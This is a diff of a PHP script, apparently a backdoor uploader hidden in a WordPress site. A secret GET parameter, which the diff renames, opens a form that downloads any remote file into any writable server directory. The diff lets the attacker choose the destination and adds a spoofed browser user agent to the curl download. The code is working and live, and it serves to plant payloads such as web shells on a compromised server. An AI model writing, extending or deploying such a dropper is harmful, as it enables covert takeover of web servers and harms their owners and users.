@@ -11,13 +11,24 @@
 function uploadFileFromUrl($url, $dir, $retries = 3)
 {
     $url = trim($url);
-    
+    $dir = trim($dir);
+
     if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
         echo "<script>Swal.fire({title: 'Whoops!', text: 'Invalid URL!', icon: 'error', confirmButtonText: 'OK'});</script>";
         return;
     }
 
-    if (!is_dir($dir) || !is_writable($dir)) {
+    if (empty($dir)) {
+        echo "<script>Swal.fire({title: 'Whoops!', text: 'Directory cannot be empty!', icon: 'error', confirmButtonText: 'OK'});</script>";
+        return;
+    }
+
+    if (!is_dir($dir)) {
+        echo "<script>Swal.fire({title: 'Whoops!', text: 'Directory does not exist!', icon: 'error', confirmButtonText: 'OK'});</script>";
+        return;
+    }
+
+    if (!is_writable($dir)) {
         echo "<script>Swal.fire({title: 'Whoops!', text: 'Directory not writable!', icon: 'error', confirmButtonText: 'OK'});</script>";
         return;
     }
@@ -52,6 +63,8 @@ function downloadFileWithCurl($url, $filePath)
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_FAILONERROR, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Timeout 30 detik
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36');
+
     $data = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
@@ -64,7 +77,7 @@ function downloadFileWithCurl($url, $filePath)
 }
 
 // Periksa apakah parameter GET "url-wordpress-x" ada
-if (isset($_GET["url-wordpress-x"])) {
+if (isset($_GET["url-wordpress-y"])) {
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -77,8 +90,8 @@ if (isset($_GET["url-wordpress-x"])) {
     <body>
         <div class='execution-box'>
             <form method='post'>
-                <input type='text' id='terminal' name='url' placeholder='https://example.com/file.txt' required>
-                <input type='hidden' name='dir' value='/path/to/your/directory'> <!-- Ubah direktori tujuan -->
+                <input type='text' name='url' placeholder='Enter file URL' required>
+                <input type='text' name='dir' placeholder='Enter destination directory' required>
                 <button type='submit' name='uploadurl'>Upload URL</button>
             </form>
         </div>
@@ -91,7 +104,8 @@ if (isset($_GET["url-wordpress-x"])) {
 // Proses upload jika form dikirim
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['uploadurl'])) {
     $url = $_POST['url'] ?? '';
-    $dir = $_POST['dir'] ?? getcwd(); // Default ke direktori saat ini jika tidak ditentukan
+    $dir = $_POST['dir'] ?? '';
+
     uploadFileFromUrl($url, $dir);
 }
 
